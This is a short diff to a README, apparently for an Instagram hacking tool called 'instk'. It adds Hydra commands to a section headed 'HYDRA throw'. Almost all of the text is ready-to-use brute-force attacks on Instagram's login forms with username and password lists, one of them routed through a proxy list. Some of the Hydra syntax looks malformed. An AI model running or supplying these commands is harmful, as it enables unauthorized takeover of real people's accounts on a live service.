@@ -24,7 +24,18 @@ bash instkshell.sh
 
 ![CAPTURE 1](https://github.com/Khalidhusain786/instk/blob/main/khalid.jpg)
 
+
+
 # HYDRA throw
 
 hydra -l usernames.txt -P passwords.txt www.instagram.com http-post-form "/login/?next=/": "_username=^USER^&_password=^PASS^:F=incorrect" -V
+
+
+hydra -L usernames.txt -P passwords.txt -x <proxy_list.txt> www.instagram.com http-post-form "/accounts/login/ajax/": "_username=^USER^&_password=^PASS^:F=incorrect" -V
+
+
+hydra -L usernames.txt -P passwords.txt www.instagram.com http-post-form "/accounts/login/ajax/": "_username=^USER^&_password=^PASS^:F=incorrect" -V
+
+
+
 
